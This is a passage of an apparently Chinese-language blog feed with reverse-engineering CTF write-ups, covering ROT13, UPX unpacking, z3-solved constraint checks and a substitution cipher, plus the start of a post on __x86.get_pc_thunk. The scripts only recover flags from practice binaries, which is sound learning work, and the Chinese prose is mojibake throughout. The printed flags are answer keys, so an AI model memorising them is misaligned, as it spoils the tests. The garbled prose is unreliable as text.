&#123;</span><br><span class="line">        alert(<span class="string">&quot;Correct flag!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(<span class="string">&quot;Incorrect flag, rot again&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å‘ç°ä¸€æ®µjsä»£ç <br>åˆ†æå‘ç°æ ¸å¿ƒé€»è¾‘ä¸»è¦æ˜¯è¿™ä¸€å¥ï¼Œåªè¦æ˜¯å­—æ¯å°±è¢«æ­£åˆ™åŒ¹é…åˆ°ï¼Œç„¶åæ‰§è¡Œä¸‹é¢è¿™ä¸ª<br><code>String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13)     ? c : c - 26);&#125;);</code><br>å¤§æ¦‚å°±æ˜¯åˆ¤æ–­å­—ç¬¦æ˜¯å¦å°äºZï¼Œå¦‚æœæ˜¯ç¬¬ä¸€ä¸ªæ‹¬å·çš„å€¼å°±å˜æˆZå¦åˆ™å˜æˆz(æ³¨æ„æ­¤æ—¶cçš„å€¼æ²¡æœ‰å‘ç”Ÿæ”¹å˜)ï¼Œç„¶åç¬¬äºŒä¸ªå°æ‹¬å·æ˜¯å°†cæœ¬èº«+13(æ³¨æ„æ­¤æ—¶cçš„å€¼å·²ç»å‘ç”Ÿäº†æ”¹å˜)<br>å†åˆ¤æ–­ä¸¤ä¸ªå€¼çš„å¤§å°å…³ç³»ï¼Œå¦‚æœå‰è€…å¤§å°±ä¸æ”¹å˜ï¼Œå¦‚æœåè€…å¤§å°±-26(å³ç›¸å½“äº+13å-26ï¼Œæœ¬è´¨æ˜¯åŸæœ¬çš„å­—ç¬¦-13)<br>å­—æ¯ä¸€å…±26ä¸ªï¼Œå¦‚æœæœ¬èº«å˜æˆzåå¤§äºæœ¬èº«+13ï¼Œé‚£ä¹ˆå­—æ¯ä¸€å®šä¼šå°äºn</p><p>æœ‰äº†è¿™ä¸ªé€»è¾‘å†™è§£å¯†è„šæœ¬å°±å¯ä»¥äº†ï¼Œéå†åŠ å¯†åçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœå½“å‰å­—ç¬¦å±äºa-mï¼Œé‚£ä¹ˆ+13ï¼Œå¦‚æœå±äºn-zï¼Œé‚£ä¹ˆ-13å³å¯<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span></span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line"></span><br><span class="line">flaglist = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> (flag[i] &lt;= <span class="string">&#x27;Z&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;A&#x27;</span>) <span class="keyword">or</span> (flag[i] &gt;= <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> flag[i] &lt;= <span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> (flag[i] &lt;= <span class="string">&#x27;M&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;A&#x27;</span>) <span class="keyword">or</span> (flag[i] &lt;= <span class="string">&#x27;m&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">            flag[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) + <span class="number">13</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) - <span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure></p><p><code>flag&#123;ClientSideLoginsAreEasy@flare-on.com&#125;</code></p><p>çœ‹äº†åˆ«çš„å¸ˆå‚…çš„wpæ‰å‘ç°è¿™æ˜¯ä¸€ç§åŠ å¯†ä¸ºROT13åŠ å¯†ï¼Œå­¦åˆ°äº†</p><blockquote><p>å¥—ç”¨ROT13åˆ°ä¸€æ®µæ–‡å­—ä¸Šä»…ä»…åªéœ€è¦æ£€æŸ¥å­—å…ƒå­—æ¯é¡ºåºå¹¶å–ä»£å®ƒåœ¨13ä½ä¹‹åçš„å¯¹åº”å­—æ¯ï¼Œæœ‰éœ€è¦è¶…è¿‡æ—¶åˆ™é‡æ–°ç»•å›26è‹±æ–‡å­—æ¯å¼€ å¤´å³å¯ã€‚Aæ¢æˆNã€Bæ¢æˆOã€ä¾æ­¤ç±»æ¨åˆ°Mæ¢æˆZï¼Œç„¶ååºåˆ—åè½¬ï¼šNæ¢æˆAã€Oæ¢æˆBã€æœ€åZæ¢æˆMã€‚åªæœ‰è¿™äº›å‡ºç°åœ¨è‹±æ–‡å­—æ¯é‡Œå¤´çš„å­—å…ƒå—å½±å“ï¼›æ•°å­—ã€ç¬¦ å·ã€ç©ºç™½å­—å…ƒä»¥åŠæ‰€æœ‰å…¶ä»–å­—å…ƒéƒ½ä¸å˜ã€‚å› ä¸ºåªæœ‰åœ¨è‹±æ–‡å­—æ¯è¡¨é‡Œå¤´åªæœ‰26ä¸ªï¼Œå¹¶ä¸”26=2Ã—13ï¼ŒROT13å‡½æ•°æ˜¯å®ƒè‡ªå·±çš„é€†åï¼š [1] </p></blockquote><p>å¯¹ä»»ä½•å­—å…ƒxï¼šROT13(ROT13(x))=ROT26(x)=xã€‚<br>ç›´æ¥æ‰¾ä¸ªåœ¨çº¿è§£å¯†å·¥å…·æ¢­å‡ºæ¥ä¹Ÿå¯ä»¥</p><h2 id="4-GUET-CTF2019-re"><a href="#4-GUET-CTF2019-re" class="headerlink" title="4.[GUET-CTF2019]re"></a>4.[GUET-CTF2019]re</h2><p>æ˜¯ä¸ªELFæ–‡ä»¶ï¼Œå…ˆchecksecä¸€ä¸‹<br><img src="https://i.loli.net/2021/04/10/oJTznurCURtXE5N.png" alt=""><br>å‘ç°å­˜åœ¨UPXå£³<br>ç›´æ¥ç”¨å·¥å…·è„±å£³<br><code>./upx -d ./re</code><br>ç„¶åè¿›å…¥idaåˆ†æï¼Œæ ¸å¿ƒé€»è¾‘å¾ˆç®€å•ï¼Œæ±‚å‡ºæ¯ä¸€ä½flagç„¶åè½¬æ¢æˆå­—ç¬¦å°±å¯ä»¥ï¼Œä½†æ˜¯æœ‰å‘ç‚¹<br><img src="https://i.loli.net/2021/04/10/6rUJXYEoli1egf5.png" alt=""></p><p>ä¸€å¼€å§‹æ˜¯æƒ³é€æ­¥æ±‚è§£çš„ï¼Œä½†æ˜¯å‘ç°è¿™ä¹Ÿå¤ªåäººç±»äº†ï¼Œç›´æ¥ç”¨æ­£åˆ™æå–å§<br>è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">flag = [</span><br><span class="line"><span class="number">166163712</span>//<span class="number">1629056</span></span><br><span class="line">,<span class="number">731332800</span>//<span class="number">6771600</span></span><br><span class="line">,<span class="number">357245568</span>//<span class="number">3682944</span></span><br><span class="line">,<span class="number">1074393000</span>//<span class="number">10431000</span></span><br><span class="line">,<span class="number">489211344</span>//<span class="number">3977328</span></span><br><span class="line">,<span class="number">518971936</span>//<span class="number">5138336</span></span><br><span class="line">,<span class="number">406741500</span>//<span class="number">7532250</span></span><br><span class="line">,<span class="number">294236496</span>//<span class="number">5551632</span></span><br><span class="line">,<span class="number">177305856</span>//<span class="number">3409728</span></span><br><span class="line">,<span class="number">650683500</span>//<span class="number">13013670</span></span><br><span class="line">,<span class="number">298351053</span>//<span class="number">6088797</span></span><br><span class="line">,<span class="number">386348487</span>//<span class="number">7884663</span></span><br><span class="line">,<span class="number">438258597</span>//<span class="number">8944053</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  if ( 5198490 * flag[14] != 249527520 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 4544518 * flag[15] != 445362764 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 3645600 * flag[17] != 174988800 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 10115280 * flag[16] != 981182160 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 9667504 * flag[18] != 493042704 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 5364450 * flag[19] != 257493600 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 13464540 * flag[20] != 767478780 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 5488432 * flag[21] != 312840624 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 14479500 * flag[22] != 1404511500 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 6451830 * flag[23] != 316139670 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 6252576 * flag[24] != 619005024 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 7763364 * flag[25] != 372641472 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 7327320 * flag[26] != 373693320 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 8741520 * flag[27] != 498266640 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 8871876 * flag[28] != 452465676 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 4086720 * flag[29] != 208422720 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 9374400 * flag[30] == 515592000 )</span></span><br><span class="line"><span class="string">    return 5759124 * flag[31] == 719890500;</span></span><br><span class="line"><span class="string">  return 0LL;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŒ¹é…è‡³å°‘ä¸‰æ¬¡æ•°å­—æ‰æœ‰æ•ˆ</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d&#123;3,&#125;&#x27;</span>)</span><br><span class="line">flagRe = pattern.findall(text)</span><br><span class="line">print(flagRe)</span><br><span class="line"></span><br><span class="line">smallList = []</span><br><span class="line">bigList = []</span><br><span class="line">flagAppend = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flagRe),<span class="number">2</span>):</span><br><span class="line">    smallList.append(<span class="built_in">int</span>(flagRe[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(flagRe),<span class="number">2</span>):</span><br><span class="line">    bigList.append(<span class="built_in">int</span>(flagRe[i]))</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">len</span>(smallList))</span><br><span class="line">print(<span class="built_in">len</span>(bigList))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(smallList)):</span><br><span class="line">    flagAppend.append(bigList[i] // smallList[i])</span><br><span class="line"></span><br><span class="line">print(flagAppend)</span><br><span class="line"></span><br><span class="line">flag = flag + flagAppend</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>(flag[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure><p>åæ¥ç”±äºè¿™ä¿©å‘ç‚¹å°±æ€ä¹ˆäº¤ä¹Ÿä¸å¯¹ï¼Œæœäº†å¸ˆå‚…ä»¬çš„wpæ‰å‘ç°â€¦<br>è¿˜æœ‰ä¸€ç§è§£æ³•å°±æ˜¯ç”¨z3çº¦æŸå™¨æ¥è§£ï¼ˆå­¦åˆ°äº†å­¦åˆ°äº†</p><blockquote><p><a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/">https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/</a></p></blockquote><p>ç”¨è¿™ç§æ–¹æ³•æ¥è§£ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ï¼Œå…ˆè§£å‡ºæ¥ç„¶åå†è½¬asciiç <br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = Int(<span class="string">&quot;flag[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">1629056</span> * flag[<span class="number">0</span>] == <span class="number">166163712</span>)</span><br><span class="line">s.add(<span class="number">6771600</span> * flag[<span class="number">1</span>] == <span class="number">731332800</span>)</span><br><span class="line">s.add(<span class="number">3682944</span> * flag[<span class="number">2</span>] == <span class="number">357245568</span>)</span><br><span class="line">s.add(<span class="number">10431000</span> * flag[<span class="number">3</span>] == <span class="number">1074393000</span>)</span><br><span class="line">s.add(<span class="number">3977328</span> * flag[<span class="number">4</span>] == <span class="number">489211344</span>)</span><br><span class="line">s.add(<span class="number">5138336</span> * flag[<span class="number">5</span>] == <span class="number">518971936</span>)</span><br><span class="line">s.add(<span class="number">7532250</span> * flag[<span class="number">7</span>] == <span class="number">406741500</span>)</span><br><span class="line">s.add(<span class="number">5551632</span> * flag[<span class="number">8</span>] == <span class="number">294236496</span>)</span><br><span class="line">s.add(<span class="number">3409728</span> * flag[<span class="number">9</span>] == <span class="number">177305856</span>)</span><br><span class="line">s.add(<span class="number">13013670</span> * flag[<span class="number">10</span>] == <span class="number">650683500</span>)</span><br><span class="line">s.add(<span class="number">6088797</span> * flag[<span class="number">11</span>] == <span class="number">298351053</span>)</span><br><span class="line">s.add(<span class="number">7884663</span> * flag[<span class="number">12</span>] == <span class="number">386348487</span>)</span><br><span class="line">s.add(<span class="number">8944053</span> * flag[<span class="number">13</span>] == <span class="number">438258597</span>)</span><br><span class="line">s.add(<span class="number">5198490</span> * flag[<span class="number">14</span>] == <span class="number">249527520</span>)</span><br><span class="line">s.add(<span class="number">4544518</span> * flag[<span class="number">15</span>] == <span class="number">445362764</span>)</span><br><span class="line">s.add(<span class="number">3645600</span> * flag[<span class="number">17</span>] == <span class="number">174988800</span>)</span><br><span class="line">s.add(<span class="number">10115280</span> * flag[<span class="number">16</span>] == <span class="number">981182160</span>)</span><br><span class="line">s.add(<span class="number">9667504</span> * flag[<span class="number">18</span>] == <span class="number">493042704</span>)</span><br><span class="line">s.add(<span class="number">5364450</span> * flag[<span class="number">19</span>] == <span class="number">257493600</span>)</span><br><span class="line">s.add(<span class="number">13464540</span> * flag[<span class="number">20</span>] == <span class="number">767478780</span>)</span><br><span class="line">s.add(<span class="number">5488432</span> * flag[<span class="number">21</span>] == <span class="number">312840624</span>)</span><br><span class="line">s.add(<span class="number">14479500</span> * flag[<span class="number">22</span>] == <span class="number">1404511500</span>)</span><br><span class="line">s.add(<span class="number">6451830</span> * flag[<span class="number">23</span>] == <span class="number">316139670</span>)</span><br><span class="line">s.add(<span class="number">6252576</span> * flag[<span class="number">24</span>] == <span class="number">619005024</span>)</span><br><span class="line">s.add(<span class="number">7763364</span> * flag[<span class="number">25</span>] == <span class="number">372641472</span>)</span><br><span class="line">s.add(<span class="number">7327320</span> * flag[<span class="number">26</span>] == <span class="number">373693320</span>)</span><br><span class="line">s.add(<span class="number">8741520</span> * flag[<span class="number">27</span>] == <span class="number">498266640</span>)</span><br><span class="line">s.add(<span class="number">8871876</span> * flag[<span class="number">28</span>] == <span class="number">452465676</span>)</span><br><span class="line">s.add(<span class="number">4086720</span> * flag[<span class="number">29</span>] == <span class="number">208422720</span>)</span><br><span class="line">s.add(<span class="number">9374400</span> * flag[<span class="number">30</span>] == <span class="number">515592000</span>)</span><br><span class="line">s.add(<span class="number">5759124</span> * flag[<span class="number">31</span>] == <span class="number">719890500</span>)</span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure></p><h2 id="5-WUSTCTF2020-level1"><a href="#5-WUSTCTF2020-level1" class="headerlink" title="5.[WUSTCTF2020]level1"></a>5.[WUSTCTF2020]level1</h2><p>æºç å’Œé€»è¾‘éƒ½å¾ˆç®€å•ï¼Œå¯¹flagè¿›è¡ŒåŠ å¯†ï¼Œç„¶åè¿˜ç»™äº†outputæ–‡ä»¶ï¼Œåº”è¯¥å°±æ˜¯flagåŠ å¯†åçš„è¾“å‡ºç»“æœ<br><img src="https://i.loli.net/2021/04/10/lTe58pKU7iIGdRz.png" alt=""></p><p>å†™ä¸ªè§£å¯†è„šæœ¬å°±è¡Œäº†ï¼ˆ1ï¼Œ3ï¼Œ5ï¼Œ7â€¦ä¸1ç›¸ä¸ä¸º1ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flagReverse = [</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">198</span>,</span><br><span class="line">    <span class="number">232</span>,</span><br><span class="line">    <span class="number">816</span>,</span><br><span class="line">    <span class="number">200</span>,</span><br><span class="line">    <span class="number">1536</span>,</span><br><span class="line">    <span class="number">300</span>,</span><br><span class="line">    <span class="number">6144</span>,</span><br><span class="line">    <span class="number">984</span>,</span><br><span class="line">    <span class="number">51200</span>,</span><br><span class="line">    <span class="number">570</span>,</span><br><span class="line">    <span class="number">92160</span>,</span><br><span class="line">    <span class="number">1200</span>,</span><br><span class="line">    <span class="number">565248</span>,</span><br><span class="line">    <span class="number">756</span>,</span><br><span class="line">    <span class="number">1474560</span>,</span><br><span class="line">    <span class="number">800</span>,</span><br><span class="line">    <span class="number">6291456</span>,</span><br><span class="line">    <span class="number">1782</span>,</span><br><span class="line">    <span class="number">65536000</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(flagReverse)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        flagReverse[i] = flagReverse[i] &gt;&gt; i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flagReverse[i] = flagReverse[i] // i</span><br><span class="line"></span><br><span class="line">    flagReverse[i] = <span class="built_in">chr</span>(flagReverse[i])</span><br><span class="line"></span><br><span class="line">flag = flagReverse[<span class="number">1</span>:]</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure><h2 id="6-Youngter-drive"><a href="#6-Youngter-drive" class="headerlink" title="6.Youngter-drive"></a>6.Youngter-drive</h2><blockquote><p>UPXè„±å£³:<a href="https://github.com/upx/upx/releases">https://github.com/upx/upx/releases</a></p></blockquote><p>å…ˆå»ä¸ªå£³<br><img src="https://i.loli.net/2021/04/11/cGXKI38bUisLfzJ.png" alt=""></p><p>mainå‡½æ•°ä¸­å¯åŠ¨äº†ä¸¤ä¸ªå­çº¿ç¨‹<br><img src="https://i.loli.net/2021/04/11/rgxAZITfhmq1ozW.png" alt=""></p><p>ç¬¬ä¸€ä¸ªçº¿ç¨‹å¯¹äºæˆ‘ä»¬è¾“å…¥çš„flagè¿›è¡Œæ›¿æ¢<br><img src="https://i.loli.net/2021/04/11/ZTrNDyLRgpScUB9.png" alt=""></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">sub_411940</span><span class="params">(<span class="keyword">int</span> source, <span class="keyword">int</span> target_in_data_1d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+D3h] [ebp-5h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *(_BYTE *)(target_in_data_1d + source);</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &lt; <span class="number">97</span> || v3 &gt; <span class="number">122</span>) &amp;&amp; (v3 &lt; <span class="number">65</span> || v3 &gt; <span class="number">90</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="string">&#x27;a&#x27;</span> || v3 &gt; <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// å¤§å†™å­—æ¯ - 38ï¼Œå³27-52</span></span><br><span class="line">    *(_BYTE *)(target_in_data_1d + source) = off_418000[<span class="number">0</span>][*(<span class="keyword">char</span> *)(target_in_data_1d + source) - <span class="number">38</span>];</span><br><span class="line">    <span class="comment">// å°†ç´¢å¼•æ˜ å°„åˆ°å¦å¤–ä¸€å¼ è¡¨è¿›è¡Œæ›¿æ¢</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// å°å†™å­—æ¯ - 96ï¼Œå³1 - 26</span></span><br><span class="line">    *(_BYTE *)(target_in_data_1d + source) = off_418000[<span class="number">0</span>][*(<span class="keyword">char</span> *)(target_in_data_1d + source) - <span class="number">96</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªçº¿ç¨‹åªæ˜¯å‡å»dataæ®µçš„ä¸€ä¸ªè®¡æ•°å™¨ï¼Œå¹¶æ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œæ“ä½œï¼Œæ‰€ä»¥å‘ç‚¹1å°±æ˜¯åœ¨æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­ï¼Œåªæœ‰å¶æ•°ä½ï¼ˆ0ï¼Œ1ï¼Œ3,â€¦29ï¼‰è¢«è¿›è¡Œæ›¿æ¢äº†<br>æ›¿æ¢é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œè§ä¸Šé¢è´´çš„æ³¨é‡Š</p><p>å‘ç‚¹2å°±æ˜¯æœ€åcheckçš„æ—¶å€™åªæ£€æŸ¥äº†29ä½ï¼Œæœ€åä¸€ä½æœçš„wpæ˜¯å¡«Eï¼ˆå¥½åƒåœ¨å®‰æ’èµ›çš„æ—¶å€™å¡«å•¥éƒ½å¯¹ï¼Œç„¶åçœ‹äº†ä¸€ä¸ªå¸ˆå‚…çš„wpè§‰å¾—åº”è¯¥å¡«Zï¼Œå› ä¸ºæ˜ å°„å›æ¥æ­£å¥½æ˜¯NULL<br><img src="https://i.loli.net/2021/04/11/d4vbaU7eFPiVZwx.png" alt=""></p><p>è„šæœ¬å¦‚ä¸‹ï¼š<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="line">flagRe = <span class="string">&quot;TOiZiZtOrYaToUwPnToBsOaOapsySa&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> v3 = *(_BYTE *)(target_in_data_1d + source);</span></span><br><span class="line"><span class="string">  if ( (v3 &lt; 97 || v3 &gt; 122) &amp;&amp; (v3 &lt; 65 || v3 &gt; 90) )</span></span><br><span class="line"><span class="string">    exit(0);</span></span><br><span class="line"><span class="string">  if ( v3 &lt; &#x27;a&#x27; || v3 &gt; &#x27;z&#x27; )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    result = off_418000[0];</span></span><br><span class="line"><span class="string">    *(_BYTE *)(target_in_data_1d + source) = off_418000[0][*(char *)(target_in_data_1d + source) - &#x27;&amp;&#x27;];</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    result = off_418000[0];</span></span><br><span class="line"><span class="string">    *(_BYTE *)(target_in_data_1d + source) = off_418000[0][*(char *)(target_in_data_1d + source) - &#x27;`&#x27;];</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line">i = <span class="number">0x1d</span></span><br><span class="line"><span class="keyword">while</span> i &gt; -<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> key.find(flagRe[i]):</span><br><span class="line">        position = key.find(flagRe[i])</span><br><span class="line">        <span class="keyword">if</span> position &lt;= <span class="number">26</span>:</span><br><span class="line">            flag.append(<span class="built_in">chr</span>(position + <span class="number">96</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag.append(<span class="built_in">chr</span>(position + <span class="number">38</span>))</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    flag.append(flagRe[i])</span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">reversed</span>(flag)</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br><span class="line">print(<span class="built_in">len</span>(flag))</span><br></pre></td></tr></table></figure></p><p>å¤§å¸ˆå‚…çš„wpï¼Œè¯¦ç»†è§£é‡Šäº†è¿™ä¸ªç¨‹åºä¸­åè°ƒè¯•çš„éƒ¨åˆ†ï¼Œå€¼å¾—é˜…è¯»:<a href="https://hx1997.github.io/2018/07/22/anheng-july-re-youngter-drive/">https://hx1997.github.io/2018/07/22/anheng-july-re-youngter-drive/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>__x86.get_pc_thunk.axå‡½æ•°</title>
      <link href="2021/04/06/ax/"/>
      <url>2021/04/06/ax/</url>
      
        <content type="html"><![CDATA[<h2 id="x86-get-pc-thunk"><a href="#x86-get-pc-thunk" class="headerlink" title="__x86.get_pc_thunk"></a>__x86.get_pc_thunk</h2><p>cè¯­è¨€åˆ°æ±‡ç¼–æŒ‡ä»¤è¿™ç¯‡åšæ–‡ä¸­ï¼Œæˆ‘ä¸€å¼€å§‹é€šè¿‡gccç¼–è¯‘æºæ–‡ä»¶ï¼Œæ²¡æœ‰å…³é—­åœ°å€éšæœºåŒ–è¿™ä¸ªé€‰é¡¹ï¼Œåœ¨ç¼–è¯‘å‡ºçš„ç¨‹åºçš„åæ±‡ç¼–ä¸­ï¼Œå‘ç°äº†å¾ˆå¥‡æ€ªçš„callæŒ‡ä»¤<br>æºç¨‹åº</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">char</span> c = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">23</span>;</span><br><span class="line"><span class="keyword">char</span> b = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">short</span> c = <span class="number">12</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åæ±‡ç¼–</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x11ad</span> &lt;main&gt;                           endbr32                                                                                    </span><br><span class="line">â”‚   <span class="number">0x11b1</span> &lt;main+<span class="number">4</span>&gt;                         <span class="keyword">push</span>   <span class="built_in">ebp</span>                                                                                 </span><br><span class="line">â”‚   <span class="number">0x11b2</span> &lt;main+<span class="number">5</span>&gt;                         <span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span>                                                                             </span><br><span class="line">â”‚   <span class="number">0x11b4</span> &lt;main+<span class="number">7</span>&gt;                         <span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x10</span>                                                                            </span><br><span class="line">â”‚   <span class="number">0x11b7</span> &lt;main+<span class="number">10</span>&gt;                        <span class="keyword">call</span>   <span class="number">0x11d9</span> &lt;__x86<span class="number">.</span>get_pc_thunk<span class="number">.</span><span class="built_in">ax</span>&gt;                                                      </span><br><span class="line">â”‚   <span class="number">0x11bc</span> &lt;main+<span class="number">15</span>&gt;                        <span class="keyword">add</span>    <span 